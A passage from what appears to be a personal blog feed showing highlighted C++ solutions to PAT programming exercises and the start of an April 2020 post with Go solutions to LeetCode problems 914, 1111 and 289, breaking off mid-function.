class="line"><span class="comment">    int s=N%100/10;</span></span><br><span class="line"><span class="comment">    int m=N%100%10;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;b;i++)</span></span><br><span class="line"><span class="comment">        printf(&quot;B&quot;);</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;s;i++)</span></span><br><span class="line"><span class="comment">        printf(&quot;S&quot;);</span></span><br><span class="line"><span class="comment">    for(int i=1;i&lt;=m;i++)</span></span><br><span class="line"><span class="comment">        printf(&quot;%d&quot;,i);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1073</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">10001</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>]==<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> pos=<span class="number">0</span>; <span class="comment">//to find E</span></span><br><span class="line">    <span class="keyword">while</span>(str[pos]!=<span class="string">&#x27;E&#x27;</span>)</span><br><span class="line">        pos++;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exp</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=pos+<span class="number">2</span>;i&lt;len;i++)</span><br><span class="line">        <span class="built_in">exp</span>=<span class="built_in">exp</span>*<span class="number">10</span>+str[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span>==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;pos;i++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(str[pos+<span class="number">1</span>]==<span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0.&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">exp</span><span class="number">-1</span>;i++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,str[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;pos;i++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;pos;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(str[i]==<span class="string">&#x27;.&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,str[i]);</span><br><span class="line">            <span class="keyword">if</span>(pos<span class="number">-3</span>!=<span class="built_in">exp</span>&amp;&amp;i==<span class="built_in">exp</span>+<span class="number">2</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">exp</span>-(pos<span class="number">-3</span>);i++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT B1048</span></span><br><span class="line"><span class="comment">char change[13]=&#123;&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;J&#x27;,&#x27;Q&#x27;,&#x27;K&#x27;&#125;;</span></span><br><span class="line"><span class="comment">void reverse(char str[])</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int len=strlen(str);</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;len/2;i++)&#123;</span></span><br><span class="line"><span class="comment">        char temp=str[i];</span></span><br><span class="line"><span class="comment">        str[i]=str[len-1-i];</span></span><br><span class="line"><span class="comment">        str[len-1-i]=temp;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    char A[101],B[101],ans[101]=&#123;0&#125;;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%s%s&quot;,A,B);</span></span><br><span class="line"><span class="comment">    reverse(A);</span></span><br><span class="line"><span class="comment">    reverse(B);</span></span><br><span class="line"><span class="comment">    char temp;</span></span><br><span class="line"><span class="comment">    int i;</span></span><br><span class="line"><span class="comment">    for(i=0;i&lt;max(strlen(A),strlen(B));i++)&#123;</span></span><br><span class="line"><span class="comment">        int numa=i&lt;strlen(A)?A[i]-&#x27;0&#x27;:0;</span></span><br><span class="line"><span class="comment">        int numb=i&lt;strlen(B)?B[i]-&#x27;0&#x27;:0;</span></span><br><span class="line"><span class="comment">        if(i%2==0)&#123;</span></span><br><span class="line"><span class="comment">            temp=change[(numa+numb)%13];</span></span><br><span class="line"><span class="comment">            ans[i]=temp;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else&#123;</span></span><br><span class="line"><span class="comment">            int temp=numb-numa;</span></span><br><span class="line"><span class="comment">            if(temp&lt;0)</span></span><br><span class="line"><span class="comment">                temp+=10;</span></span><br><span class="line"><span class="comment">            ans[i]=temp+&#x27;0&#x27;;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    reverse(ans);</span></span><br><span class="line"><span class="comment">    printf(&quot;%s&quot;,ans);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1077</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d\n&quot;</span>,&amp;N);</span><br><span class="line">    <span class="built_in">string</span> str;</span><br><span class="line">    <span class="built_in">string</span> temp;</span><br><span class="line">    <span class="comment">//temp.resize(260);</span></span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    getline(<span class="built_in">cin</span>,temp);</span><br><span class="line">    reverse(temp.begin(),temp.end());</span><br><span class="line">    <span class="comment">//cout&lt;&lt;temp&lt;&lt;endl;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="comment">//getchar();</span></span><br><span class="line">        <span class="comment">//str.resize(260);</span></span><br><span class="line">        getline(<span class="built_in">cin</span>,str);</span><br><span class="line">        reverse(str.begin(),str.end());</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;temp.length()&amp;&amp;j&lt;str.length();j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(temp[j]!=str[j])&#123;</span><br><span class="line">                <span class="keyword">if</span>(j==<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;nai&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                        temp= temp.substr(<span class="number">0</span>, j);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    reverse(temp.begin(),temp.end());</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;temp&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//system(&quot;pause&quot;);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1035</span></span><br><span class="line"><span class="comment">struct node&#123;</span></span><br><span class="line"><span class="comment">    char name[11];</span></span><br><span class="line"><span class="comment">    char pwd[11];</span></span><br><span class="line"><span class="comment">    int flag=0;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int N;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;N);</span></span><br><span class="line"><span class="comment">    node student[N];</span></span><br><span class="line"><span class="comment">    int count=0;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;N;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%s %s&quot;,student[i].name,student[i].pwd);</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;strlen(student[i].pwd);j++)&#123;</span></span><br><span class="line"><span class="comment">            if(student[i].pwd[j]==&#x27;1&#x27;)&#123;</span></span><br><span class="line"><span class="comment">                student[i].flag=1;</span></span><br><span class="line"><span class="comment">                student[i].pwd[j]=&#x27;@&#x27;;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            else if(student[i].pwd[j]==&#x27;0&#x27;)&#123;</span></span><br><span class="line"><span class="comment">                student[i].flag=1;</span></span><br><span class="line"><span class="comment">                student[i].pwd[j]=&#x27;%&#x27;;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            else if(student[i].pwd[j]==&#x27;l&#x27;)&#123;</span></span><br><span class="line"><span class="comment">                student[i].flag=1;</span></span><br><span class="line"><span class="comment">                student[i].pwd[j]=&#x27;L&#x27;;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            else if(student[i].pwd[j]==&#x27;O&#x27;)&#123;</span></span><br><span class="line"><span class="comment">                student[i].flag=1;</span></span><br><span class="line"><span class="comment">                student[i].pwd[j]=&#x27;o&#x27;;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        if(student[i].flag==1)</span></span><br><span class="line"><span class="comment">            count++;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    if(count==0&amp;&amp;N==1)</span></span><br><span class="line"><span class="comment">        printf(&quot;There is 1 account and no account is modified&quot;,N);</span></span><br><span class="line"><span class="comment">    else if(count==0&amp;&amp;N!=1)</span></span><br><span class="line"><span class="comment">        printf(&quot;There are %d accounts and no account is modified&quot;,N);</span></span><br><span class="line"><span class="comment">    else&#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;%d\n&quot;,count);</span></span><br><span class="line"><span class="comment">        for(int i=0;i&lt;N;i++)&#123;</span></span><br><span class="line"><span class="comment">            if(student[i].flag==1)</span></span><br><span class="line"><span class="comment">                printf(&quot;%s %s\n&quot;,student[i].name,student[i].pwd);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1005</span></span><br><span class="line"><span class="comment">char* change[10]=&#123;&quot;zero&quot;,&quot;one&quot;,&quot;two&quot;,&quot;three&quot;,&quot;four&quot;,&quot;five&quot;,&quot;six&quot;,&quot;seven&quot;,&quot;eight&quot;,&quot;nine&quot;&#125;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int  main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    char str[101];</span></span><br><span class="line"><span class="comment">    char* ans[101];</span></span><br><span class="line"><span class="comment">    scanf(&quot;%s&quot;,str);</span></span><br><span class="line"><span class="comment">    int len=strlen(str);</span></span><br><span class="line"><span class="comment">    int sum=0;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;len;i++)&#123;</span></span><br><span class="line"><span class="comment">        sum+=str[i]-&#x27;0&#x27;;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    //printf(&quot;%d&quot;,sum);</span></span><br><span class="line"><span class="comment">    if(sum==0)&#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;zero&quot;);</span></span><br><span class="line"><span class="comment">        return 0;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    int i;</span></span><br><span class="line"><span class="comment">    for(i=0;sum!=0;i++)&#123;</span></span><br><span class="line"><span class="comment">        ans[i]=change[sum%10];</span></span><br><span class="line"><span class="comment">        sum/=10;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    i--;</span></span><br><span class="line"><span class="comment">    for(;i&gt;0;i--)</span></span><br><span class="line"><span class="comment">        printf(&quot;%s &quot;,ans[i]);</span></span><br><span class="line"><span class="comment">    printf(&quot;%s&quot;,ans[0]);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1001</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int a,b;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d%d&quot;,&amp;a,&amp;b);</span></span><br><span class="line"><span class="comment">    int c=a+b;</span></span><br><span class="line"><span class="comment">    if(c&lt;0)&#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;-&quot;);</span></span><br><span class="line"><span class="comment">        c=-c;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    string s=to_string(c);</span></span><br><span class="line"><span class="comment">    reverse(s.begin(),s.end());</span></span><br><span class="line"><span class="comment">    int len=s.length();</span></span><br><span class="line"><span class="comment">    for(int i=len-1;i&gt;=0;i--)&#123;</span></span><br><span class="line"><span class="comment">        if((i+1)%3==0&amp;&amp;i!=len-1)&#123;</span></span><br><span class="line"><span class="comment">            printf(&quot;,&quot;);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        printf(&quot;%c&quot;,s[i]);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span>* sat[<span class="number">5</span>]=&#123;<span class="string">&quot;Shi&quot;</span>,<span class="string">&quot;Bai&quot;</span>,<span class="string">&quot;Qian&quot;</span>,<span class="string">&quot;Wan&quot;</span>,<span class="string">&quot;Yi&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">char</span>* num[<span class="number">10</span>]=&#123;<span class="string">&quot;ling&quot;</span>,<span class="string">&quot;yi&quot;</span>,<span class="string">&quot;er&quot;</span>,<span class="string">&quot;san&quot;</span>,<span class="string">&quot;si&quot;</span>,<span class="string">&quot;wu&quot;</span>,<span class="string">&quot;liu&quot;</span>,<span class="string">&quot;qi&quot;</span>,<span class="string">&quot;ba&quot;</span>,<span class="string">&quot;jiu&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">12</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">int</span> left=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> right=len<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>]==<span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fu&quot;</span>);</span><br><span class="line">        left++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(left&lt;=right)</span><br><span class="line">        right-=<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">while</span>(left&lt;len)&#123;</span><br><span class="line">        <span class="keyword">bool</span> flag=<span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">bool</span> isPrint=<span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;=right)&#123;</span><br><span class="line">            <span class="keyword">if</span>(left&gt;<span class="number">0</span>&amp;&amp;str[left]==<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                flag=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(flag==<span class="literal">true</span>)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot; ling&quot;</span>);</span><br><span class="line">                    flag=<span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(left&gt;<span class="number">0</span>)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,num[str[left]-<span class="string">&#x27;0&#x27;</span>]);</span><br><span class="line">                isPrint=<span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">if</span>(left!=right)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot; %s&quot;</span>,sat[right-left<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        left++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(isPrint==<span class="literal">true</span>&amp;&amp;right!=len<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; %s&quot;</span>,sat[(len<span class="number">-1</span>-right)/<span class="number">4</span>+<span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        right+=<span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>算法唯手熟尔4月</title>
    <url>/2020/04/09/%E7%AE%97%E6%B3%95%E5%94%AF%E6%89%8B%E7%86%9F%E5%B0%944%E6%9C%88/</url>
    <content><![CDATA[<p>4月不做咸鱼，更多的是为了补上一些语法上的坑</p>
<span id="more"></span>

<h3 id="2020-4-1"><a href="#2020-4-1" class="headerlink" title="2020/4/1"></a>2020/4/1</h3><h4 id="leetcode-914-卡牌分组-Go"><a href="#leetcode-914-卡牌分组-Go" class="headerlink" title="leetcode 914. 卡牌分组_Go"></a>leetcode 914. 卡牌分组_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">gcd</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> b == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> a</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> gcd(b, a%b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hasGroupsSizeX</span><span class="params">(deck []<span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(deck); i++ &#123;</span><br><span class="line">		m[deck[i]]++</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> _, value := <span class="keyword">range</span> m &#123;</span><br><span class="line">		<span class="keyword">for</span> _, k := <span class="keyword">range</span> m &#123;</span><br><span class="line">			<span class="keyword">if</span> gcd(value, k) &lt; <span class="number">2</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 感觉就是一个Hash，再加上gcd</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	deck := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>&#125;</span><br><span class="line">	fmt.Println(hasGroupsSizeX(deck))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="leetcode-1111-有效括号的嵌套深度-Go"><a href="#leetcode-1111-有效括号的嵌套深度-Go" class="headerlink" title="leetcode 1111. 有效括号的嵌套深度_Go"></a>leetcode 1111. 有效括号的嵌套深度_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">maxDepthAfterSplit</span><span class="params">(seq <span class="keyword">string</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">	stack := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">0</span>, <span class="built_in">len</span>(seq))</span><br><span class="line">	<span class="keyword">var</span> deep = <span class="number">-1</span></span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> seq &#123;</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">string</span>(v) == <span class="string">&quot;(&quot;</span> &#123;</span><br><span class="line">			deep++</span><br><span class="line">			stack = <span class="built_in">append</span>(stack, deep%<span class="number">2</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">string</span>(v) == <span class="string">&quot;)&quot;</span> &#123;</span><br><span class="line">			stack = <span class="built_in">append</span>(stack, deep%<span class="number">2</span>)</span><br><span class="line">			deep--</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> stack</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 说实话，这题目我都看了半天</span></span><br><span class="line"><span class="comment">// depth(&quot;(&quot; + A + &quot;)&quot;) = 1 + depth(A) 关键是这句话理解就好了</span></span><br><span class="line"><span class="comment">// 分析到最后就是把左括号竟可能的分成两个序列即可</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	seq := <span class="string">&quot;(()())&quot;</span></span><br><span class="line">	ans := maxDepthAfterSplit(seq)</span><br><span class="line">	fmt.Println(ans)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-2"><a href="#2020-4-2" class="headerlink" title="2020/4/2"></a>2020/4/2</h3><h4 id="leetcode-289-生命游戏-Go"><a href="#leetcode-289-生命游戏-Go" class="headerlink" title="leetcode 289. 生命游戏_Go"></a>leetcode 289. 生命游戏_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">abs</span><span class="params">(a <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> a &lt; <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> -a</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">gameOfLife</span><span class="params">(board [][]<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	way := [<span class="number">3</span>]<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">-1</span>&#125;</span><br><span class="line">	row := <span class="built_in">len</span>(board)</span><br><span class="line">	col := <span class="built_in">len</span>(board[<span class="number">0</span>])</span><br><span class="line">	<span class="comment">// select every node</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; row; i++ &#123;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; col; j++ &#123;</span><br><span class="line">			aliveNum := <span class="number">0</span></span><br><span class="line">			<span class="comment">// select each direction</span></span><br><span class="line">			<span class="comment">// 和迷宫走法一样</span></span><br><span class="line">			<span class="keyword">for</span> x := <span class="number">0</span>; x &lt; <span class="number">3</span>; x++ &#123;</span><br><span class="line">				<span class="keyword">for</span> y := <span class="number">0</span>; y &lt; <span class="number">3</span>; y++ 